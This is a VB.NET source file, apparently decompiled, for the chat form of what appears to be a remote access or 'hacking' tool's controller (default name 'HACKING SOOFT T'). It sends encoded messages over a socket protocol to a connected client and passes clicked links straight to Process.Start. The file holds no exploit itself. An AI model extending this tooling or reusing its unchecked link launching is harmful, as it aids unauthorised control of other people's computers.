﻿Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Public Class FrmChate
    Inherits Form

    Public Sub New()
        AddHandler MyBase.FormClosing, New FormClosingEventHandler(AddressOf Me.FrmChate_FormClosing)
        AddHandler MyBase.Load, New EventHandler(AddressOf Me.FrmChate_Load)
        Me.hk = "HACKING SOOFT T"
        Me.InitializeComponent()
    End Sub
    Public hk As String
    Public osk As MdClient
    Public sk As MdClient

    Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Timer1.Tick
        If ((Me.sk Is Nothing) Or (Me.osk Is Nothing)) Then
            If (Me.T2.Enabled Or (Me.T1.Text = "")) Then
                Me.T1.AppendText("Disconnected ...")
            End If
            Me.T2.Enabled = False
            Me.Button1.Enabled = False
            Me.sk.Send("@")
            Me.sk.CN = False
            Me.Close()
        ElseIf (Not Me.sk.CN Or Not Me.osk.CN) Then
            If (Me.T2.Enabled Or (Me.T1.Text = "")) Then
                Me.T1.AppendText("Disconnected ...")
            End If
            Me.T2.Enabled = False
            Me.Button1.Enabled = False
            Me.sk.Send("@")
            Me.sk.CN = False
            Me.Close()
        End If
    End Sub

    Private Sub T2_KeyDown(ByVal sender As Object, ByVal e As KeyEventArgs) Handles T2.KeyDown
        If (e.KeyCode = Keys.Enter) Then
            e.SuppressKeyPress = True
            If (Me.T2.Text <> "") Then
                Dim chat As FrmChate = Me
                SyncLock chat
                    Me.T1.SelectionStart = Me.T1.TextLength
                    Me.T1.SelectionFont = New Font(Me.T1.Font, FontStyle.Bold)
                    Me.T1.AppendText(("[" & Me.hk & "] "))
                    Me.T1.SelectionFont = Me.T1.Font
                    Me.T1.AppendText((Me.T2.Text & ChrW(13) & ChrW(10)))
                    Me.T1.SelectionStart = Me.T1.TextLength
                    Me.T1.ScrollToCaret()
                    Dim box As TextBox = Me.T2
                    Dim text As String = box.Text
                    box.Text = [text]
                    Me.sk.Send(("!" & MdSokserver.Y & MdFN.ENB([text])))
                    Me.T2.Text = ""
                End SyncLock
            End If
        Else
            Me.T2.Select()
        End If
    End Sub

    Private Sub T1_LinkClicked(ByVal sender As Object, ByVal e As LinkClickedEventArgs) Handles T1.LinkClicked
        Try
            Process.Start(e.LinkText)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Button1.Click
        If (Me.T2.Text <> "") Then
            Dim chat As FrmChate = Me
            SyncLock chat
                Me.T1.SelectionStart = Me.T1.TextLength
                Me.T1.SelectionFont = New Font(Me.T1.Font, FontStyle.Bold)
                Me.T1.AppendText(("[" & Me.hk & "] "))
                Me.T1.SelectionFont = Me.T1.Font
                Me.T1.AppendText((Me.T2.Text & ChrW(13) & ChrW(10)))
                Me.T1.SelectionStart = Me.T1.TextLength
                Me.T1.ScrollToCaret()
                Dim box As TextBox = Me.T2
                Dim text As String = box.Text
                box.Text = [text]
                Me.sk.Send(("!" & MdSokserver.Y & MdFN.ENB([text])))
                Me.T2.Text = ""
            End SyncLock
        End If
    End Sub

    Private Sub FrmChate_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        If Me.sk.CN Then
            Me.sk.Send("@")
        End If
        Me.sk.CN = False
    End Sub

    Private Sub FrmChate_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Text = Conversions.ToString(MdSokserver.vno(osk.L))
        Me.Show()
        Dim str As String = Interaction.InputBox("NOME.", "Chat", hk, -1)
        If (str = "") Then
            sk.CN = False
        Else
            hk = str
            sk.Send(("~" & MdSokserver.Y & MdFN.ENB(hk)))
        End If
        Me.Timer1.Enabled = True
        Me.T2.Select()
        Me.T2.Focus()
    End Sub
End Class